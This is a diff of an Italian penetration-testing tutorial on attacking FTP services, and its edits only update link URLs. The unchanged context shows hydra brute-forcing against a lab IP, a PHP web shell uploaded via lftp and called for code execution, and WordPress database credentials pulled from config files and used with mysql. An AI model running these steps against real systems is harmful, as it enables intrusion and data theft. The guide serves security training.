@@ -135,7 +135,7 @@ drwxr-xr-x   2 ftp ftp     4096 Dec 01 incoming/
 Login failed.
 ```
 
-**Lettura dell'output:** anonymous attivo con directory `pub/` (lettura) e `incoming/` (potenzialmente writable). Per [upload di file malevoli](https://hackita.it/articoli/webshell) testa la scrittura su `incoming/`.
+**Lettura dell'output:** anonymous attivo con directory `pub/` (lettura) e `incoming/` (potenzialmente writable). Per [upload di file malevoli](https://hackita.it/articoli/webshell/) testa la scrittura su `incoming/`.
 
 ### File listing ricorsivo
 
@@ -159,7 +159,7 @@ lftp> find / | head -50
 /www/index.html
 ```
 
-**Lettura dell'output:** backup con shadow, dump MySQL e chiave SSH root. Config con nginx.conf e wp-config.php (contiene credenziali database WordPress). Target primari per il download. Correla con la [guida alla porta 3306 MySQL](https://hackita.it/articoli/mysql) per accedere al database.
+**Lettura dell'output:** backup con shadow, dump MySQL e chiave SSH root. Config con nginx.conf e wp-config.php (contiene credenziali database WordPress). Target primari per il download. Correla con la [guida alla porta 3306 MySQL](https://hackita.it/articoli/porta-3306-mysql/) per accedere al database.
 
 ### Verifica permessi di scrittura
 
@@ -203,7 +203,7 @@ hydra -L users.txt -P /usr/share/wordlists/common.txt ftps://10.10.10.70:990 -t 
 0 valid passwords found
 ```
 
-**Cosa fai dopo:** con credenziali valide, accedi e scarica file sensibili. Testa le stesse credenziali su SSH (22), SMB (445) e altri servizi — il [password reuse](https://hackita.it/articoli/bruteforce) è molto comune per gli account di backup.
+**Cosa fai dopo:** con credenziali valide, accedi e scarica file sensibili. Testa le stesse credenziali su SSH (22), SMB (445) e altri servizi — il [password reuse](https://hackita.it/articoli/brute-force/) è molto comune per gli account di backup.
 
 **Download file critici**
 
@@ -240,7 +240,7 @@ lftp> put /tmp/shell.php -o /www/shell.php
 shell.php uploaded
 ```
 
-**Cosa fai dopo:** accedi a `http://10.10.10.70/shell.php?c=id`. Se PHP è attivo, hai RCE. Per una reverse shell completa, consulta le [tecniche di post-exploitation](https://hackita.it/articoli/post-exploitation).
+**Cosa fai dopo:** accedi a `http://10.10.10.70/shell.php?c=id`. Se PHP è attivo, hai RCE. Per una reverse shell completa, consulta le [tecniche di post-exploitation](https://hackita.it/articoli/post-exploitation/).
 
 **Credential extraction da file di configurazione**
 
@@ -258,7 +258,7 @@ define('AUTH_KEY', 'a1b2c3d4...');
 define('SECURE_AUTH_KEY', 'e5f6g7h8...');
 ```
 
-**Cosa fai dopo:** `W0rdPr3ss_DB_2026!` è la password del database MySQL. Connettiti: `mysql -h 10.10.10.70 -u wp_user -p'W0rdPr3ss_DB_2026!' wp_database`. Per accedere al [database MySQL da remoto](https://hackita.it/articoli/mysql), usa questa password.
+**Cosa fai dopo:** `W0rdPr3ss_DB_2026!` è la password del database MySQL. Connettiti: `mysql -h 10.10.10.70 -u wp_user -p'W0rdPr3ss_DB_2026!' wp_database`. Per accedere al [database MySQL da remoto](https://hackita.it/articoli/porta-3306-mysql/), usa questa password.
 
 ## 5. Scenari Pratici di Pentest
 
